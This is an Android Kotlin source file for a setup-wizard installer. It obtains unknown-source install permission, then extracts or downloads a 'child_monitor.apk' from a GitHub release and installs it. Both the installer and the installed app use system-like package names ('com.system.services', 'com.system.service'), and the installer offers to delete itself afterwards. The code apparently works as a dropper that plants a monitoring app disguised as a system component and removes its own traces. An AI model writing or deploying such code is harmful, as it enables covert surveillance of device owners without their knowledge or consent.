package com.system.services

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import okhttp3.OkHttpClient
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    companion object {
        private const val BUNDLED_APK_NAME = "child_monitor.apk"
        private const val FALLBACK_URL =
            "https://github.com/godofthunder7890-crypto/ChildMonitor/releases/download/latest-build/ChildMonitor.apk"
        private const val INSTALL_ACTION = "com.system.services.INSTALL_DONE"
        private const val TARGET_PKG = "com.system.service"

        private const val STEP_WELCOME    = 0
        private const val STEP_PERMISSION = 1
        private const val STEP_DOWNLOAD   = 2
        private const val STEP_INSTALL    = 3
        private const val STEP_DONE       = 4
        private const val STEP_ERROR      = -1
        private const val TOTAL_DOTS      = 4   // steps 1-4 shown as dots
    }

    // ── Panels
    private lateinit var panelWelcome:    View
    private lateinit var panelPermission: View
    private lateinit var panelDownload:   View
    private lateinit var panelInstall:    View
    private lateinit var panelDone:       View
    private lateinit var panelError:      View

    // ── Header
    private lateinit var stepDots: LinearLayout
    private lateinit var btnBack:  ImageView

    // ── Welcome
    private lateinit var btnStart: Button

    // ── Permission
    private lateinit var btnOpenSettings: Button
    private lateinit var btnPermDone:     Button

    // ── Download
    private lateinit var progressBar:       ProgressBar
    private lateinit var tvPercent:         TextView
    private lateinit var tvMb:              TextView
    private lateinit var tvSpeed:           TextView
    private lateinit var tvEta:             TextView
    private lateinit var tvDownloadSub:     TextView
    private lateinit var btnCancelDownload: Button

    // ── Error
    private lateinit var tvErrorMsg: TextView
    private lateinit var btnRetry:   Button

    // ── Done
    private lateinit var btnOpenApp:         Button
    private lateinit var btnDeleteInstaller: Button

    // ── Footer
    private lateinit var tvVersion: TextView

    // ── State
    private var currentStep     = STEP_WELCOME
    private var downloadUrl     = FALLBACK_URL
    private var expectedSha256  = ""
    private var downloadedFile: File? = null

    private val okClient = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(90, TimeUnit.SECONDS)
        .followRedirects(true)
        .build()

    // ── Download service events
    private val downloadReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            when (intent?.action) {
                DownloadService.ACTION_PROGRESS -> {
                    val pct    = intent.getIntExtra(DownloadService.EXTRA_PERCENT, 0)
                    val mbDone = intent.getFloatExtra(DownloadService.EXTRA_MB_DONE, 0f)
                    val mbTot  = intent.getFloatExtra(DownloadService.EXTRA_MB_TOTAL, 0f)
                    val spd    = intent.getIntExtra(DownloadService.EXTRA_SPEED, 0)
                    val eta    = intent.getIntExtra(DownloadService.EXTRA_ETA, -1)
                    updateDownloadUI(pct, mbDone, mbTot, spd, eta)
                }
                DownloadService.ACTION_COMPLETE -> {
                    val path = intent.getStringExtra(DownloadService.EXTRA_FILE) ?: return
                    downloadedFile = File(path)
                    showStep(STEP_INSTALL)
                    installApk(downloadedFile!!)
                }
                DownloadService.ACTION_ERROR -> {
                    showError(intent.getStringExtra(DownloadService.EXTRA_ERROR) ?: "Download failed")
                }
            }
        }
    }

    // ── PackageInstaller result
    private val installReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            when (intent?.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)) {
                PackageInstaller.STATUS_SUCCESS -> showStep(STEP_DONE)
                PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                    // BUG #15 FIX: Use API 33+ getParcelableExtra with class param
                      val launchIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                          intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                      } else {
                          @Suppress("DEPRECATION") intent.getParcelableExtra(Intent.EXTRA_INTENT)
                      }
                      launchIntent?.let { startActivity(it) }
                }
                else -> {
                    val f = downloadedFile ?: File(cacheDir, "update.apk")
                    if (f.exists()) installWithFileProvider(f)
                    else showError("Installation failed. Please try again.")
                }
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        CrashHandler.install(this)   // Flash Get: DefaultCrashActivity equivalent

        setContentView(R.layout.activity_main)
        bindViews()
        buildStepDots()
        setupButtons()
        registerReceivers()

        tvVersion.text = "v${DeviceHelper.getAppVersion(this)}  •  ${DeviceHelper.getDeviceModel()}"

        showStep(STEP_WELCOME)
        fetchLatestVersion()          // Flash Get: GetInstallConfig equivalent
    }

    // ── Bind all view references ──────────────────────────────────────────
    private fun bindViews() {
        panelWelcome    = findViewById(R.id.panelWelcome)
        panelPermission = findViewById(R.id.panelPermission)
        panelDownload   = findViewById(R.id.panelDownload)
        panelInstall    = findViewById(R.id.panelInstall)
        panelDone       = findViewById(R.id.panelDone)
        panelError      = findViewById(R.id.panelError)

        stepDots = findViewById(R.id.stepDots)
        btnBack  = findViewById(R.id.btnBack)

        btnStart        = findViewById(R.id.btnStart)
        btnOpenSettings = findViewById(R.id.btnOpenSettings)
        btnPermDone     = findViewById(R.id.btnPermDone)

        progressBar       = findViewById(R.id.progressBar)
        tvPercent         = findViewById(R.id.tvPercent)
        tvMb              = findViewById(R.id.tvMb)
        tvSpeed           = findViewById(R.id.tvSpeed)
        tvEta             = findViewById(R.id.tvEta)
        tvDownloadSub     = findViewById(R.id.tvDownloadSub)
        btnCancelDownload = findViewById(R.id.btnCancelDownload)

        tvErrorMsg = findViewById(R.id.tvErrorMsg)
        btnRetry   = findViewById(R.id.btnRetry)

        btnOpenApp         = findViewById(R.id.btnOpenApp)
        btnDeleteInstaller = findViewById(R.id.btnDeleteInstaller)

        tvVersion = findViewById(R.id.tvVersion)
    }

    // ── Step indicator dots ───────────────────────────────────────────────
    private fun buildStepDots() {
        stepDots.removeAllViews()
        val dotSizePx = resources.getDimensionPixelSize(R.dimen.dot_size)
        val marginPx  = resources.getDimensionPixelSize(R.dimen.dot_margin)
        repeat(TOTAL_DOTS) {
            val dot = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(dotSizePx, dotSizePx).also { lp ->
                    lp.setMargins(marginPx, 0, marginPx, 0)
                }
                setBackgroundResource(R.drawable.dot_inactive)
            }
            stepDots.addView(dot)
        }
    }

    private fun refreshDots(step: Int) {
        val dotIndex = step - 1   // step 1 → dot 0, step 4 → dot 3
        for (i in 0 until stepDots.childCount) {
            stepDots.getChildAt(i).setBackgroundResource(
                if (i <= dotIndex) R.drawable.dot_active else R.drawable.dot_inactive
            )
        }
    }

    // ── Button wiring ─────────────────────────────────────────────────────
    private fun setupButtons() {
        btnBack.setOnClickListener {
            if (currentStep == STEP_PERMISSION) showStep(STEP_WELCOME)
        }

        btnStart.setOnClickListener {
            if (!packageManager.canRequestPackageInstalls()) showStep(STEP_PERMISSION)
            else beginDownloadFlow()
        }

        btnOpenSettings.setOnClickListener {
            startActivity(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:$packageName"))
            )
        }

        btnPermDone.setOnClickListener {
            if (packageManager.canRequestPackageInstalls()) beginDownloadFlow()
            else Toast.makeText(this, R.string.perm_not_granted, Toast.LENGTH_SHORT).show()
        }

        btnCancelDownload.setOnClickListener {
            stopService(Intent(this, DownloadService::class.java))
            showStep(STEP_WELCOME)
        }

        btnRetry.setOnClickListener { showStep(STEP_WELCOME) }

        btnOpenApp.setOnClickListener {
            packageManager.getLaunchIntentForPackage(TARGET_PKG)?.let { startActivity(it) }
        }

        btnDeleteInstaller.setOnClickListener {
            startActivity(
                Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName")).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            )
            finish()
        }
    }

    // ── BroadcastReceivers ─────────────────────────────────────────────────
    private fun registerReceivers() {
        val dlFilter = IntentFilter().apply {
            addAction(DownloadService.ACTION_PROGRESS)
            addAction(DownloadService.ACTION_COMPLETE)
            addAction(DownloadService.ACTION_ERROR)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(downloadReceiver, dlFilter, RECEIVER_NOT_EXPORTED)
            registerReceiver(installReceiver,  IntentFilter(INSTALL_ACTION), RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(downloadReceiver, dlFilter)
            registerReceiver(installReceiver,  IntentFilter(INSTALL_ACTION))
        }
    }

    // ── Step navigation ───────────────────────────────────────────────────
    private fun showStep(step: Int) {
        currentStep = step
        listOf(panelWelcome, panelPermission, panelDownload, panelInstall, panelDone, panelError)
            .forEach { it.visibility = View.GONE }

        val target = when (step) {
            STEP_WELCOME    -> panelWelcome
            STEP_PERMISSION -> panelPermission
            STEP_DOWNLOAD   -> panelDownload
            STEP_INSTALL    -> panelInstall
            STEP_DONE       -> panelDone
            else            -> panelError
        }
        target.visibility = View.VISIBLE
        target.alpha = 0f
        target.animate().alpha(1f).setDuration(220).start()

        // Dots visible only during active steps 1-4
        stepDots.visibility = if (step in 1..4) View.VISIBLE else View.GONE
        if (step in 1..4) refreshDots(step)

        // Back arrow only on permission step
        btnBack.visibility = if (step == STEP_PERMISSION) View.VISIBLE else View.INVISIBLE
    }

    // ── Download flow ──────────────────────────────────────────────────────
    private fun beginDownloadFlow() {
        val hasBundled = try {
            BUNDLED_APK_NAME in (assets.list("") ?: emptyArray())
        } catch (_: Exception) { false }

        showStep(STEP_DOWNLOAD)
        if (hasBundled) {
            tvDownloadSub.text = getString(R.string.download_extracting)
            extractFromAssets()
        } else {
            tvDownloadSub.text = getString(R.string.download_checking)
            launchDownloadService()
        }
    }

    /** Extract bundled APK from assets (fast-path, no network needed) */
    private fun extractFromAssets() {
        Thread {
            try {
                val outFile = File(cacheDir, "update.apk")
                val totalBytes = assets.openFd(BUNDLED_APK_NAME).length
                var written = 0L
                val startMs = System.currentTimeMillis()
                assets.open(BUNDLED_APK_NAME).use { input ->
                    FileOutputStream(outFile).use { output ->
                        val buf = ByteArray(32 * 1024)
                        var read: Int
                        while (input.read(buf).also { read = it } != -1) {
                            output.write(buf, 0, read)
                            written += read
                            val pct   = if (totalBytes > 0) (written * 100 / totalBytes).toInt() else 0
                            val ms    = (System.currentTimeMillis() - startMs).coerceAtLeast(1)
                            // BUG #12 FIX: bytes/ms ≠ KB/s
                            val spd   = (written * 1000L / (ms * 1024L)).toInt()
                            val mbD   = written / 1_048_576f
                            val mbT   = totalBytes / 1_048_576f
                            runOnUiThread { updateDownloadUI(pct, mbD, mbT, spd, -1) }
                        }
                    }
                }
                runOnUiThread {
                    downloadedFile = outFile
                    showStep(STEP_INSTALL)
                    installApk(outFile)
                }
            } catch (e: Exception) {
                runOnUiThread { showError(e.message ?: "Extraction failed") }
            }
        }.start()
    }

    /** Start DownloadService (OkHttp foreground download, Flash Get style) */
    private fun launchDownloadService() {
        val svc = Intent(this, DownloadService::class.java).apply {
            putExtra(DownloadService.EXTRA_URL,    downloadUrl)
            putExtra(DownloadService.EXTRA_SHA256, expectedSha256)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
        else startService(svc)
    }

    private fun updateDownloadUI(pct: Int, mbDone: Float, mbTotal: Float, speedKbs: Int, etaSecs: Int) {
        if (pct >= 0) {
            progressBar.isIndeterminate = false
            progressBar.progress = pct
            tvPercent.text = "$pct%"
        } else {
            progressBar.isIndeterminate = true
            tvPercent.text = "--"
        }
        tvMb.text = String.format("%.1f MB / %.1f MB", mbDone, mbTotal)
        tvMb.visibility = View.VISIBLE
        tvSpeed.text = "${speedKbs} KB/s"
        tvSpeed.visibility = View.VISIBLE
        tvEta.text   = when {
            etaSecs < 0   -> getString(R.string.eta_calculating)
            etaSecs < 60  -> getString(R.string.eta_seconds,  etaSecs)
            else           -> getString(R.string.eta_minutes, etaSecs / 60)
        }
    }

    // ── Install ────────────────────────────────────────────────────────────
    private fun installApk(apkFile: File) {
        try {
            val installer = packageManager.packageInstaller
            val params    = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sessionId = installer.createSession(params)
            installer.openSession(sessionId).use { session ->
                session.openWrite("package", 0, apkFile.length()).use { out ->
                    apkFile.inputStream().use { it.copyTo(out) }
                    session.fsync(out)
                }
                val pi = PendingIntent.getBroadcast(
                    this, sessionId,
                    Intent(INSTALL_ACTION),
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                )
                session.commit(pi.intentSender)
            }
        } catch (_: Exception) {
            installWithFileProvider(apkFile)
        }
    }

    private fun installWithFileProvider(apkFile: File) {
        try {
            val uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", apkFile)
            startActivity(Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            })
        } catch (e: Exception) {
            showError("Install failed: ${e.message}")
        }
    }

    private fun showError(msg: String) {
        tvErrorMsg.text = msg
        showStep(STEP_ERROR)
    }

    // ── GitHub version check (Flash Get: GetInstallConfig) ────────────────
    private fun fetchLatestVersion() {
        Thread {
            val info = VersionChecker.fetchLatest(okClient)
            runOnUiThread {
                if (info != null) {
                    downloadUrl    = info.downloadUrl
                    expectedSha256 = info.sha256
                }
                // else keep FALLBACK_URL
            }
        }.start()
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────
    override fun onResume() {
        super.onResume()
        // Returning from Settings on permission step
        if (currentStep == STEP_PERMISSION && packageManager.canRequestPackageInstalls()) {
            beginDownloadFlow()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(downloadReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(installReceiver)  } catch (_: Exception) {}
        okClient.dispatcher.executorService.shutdown()
    }
}
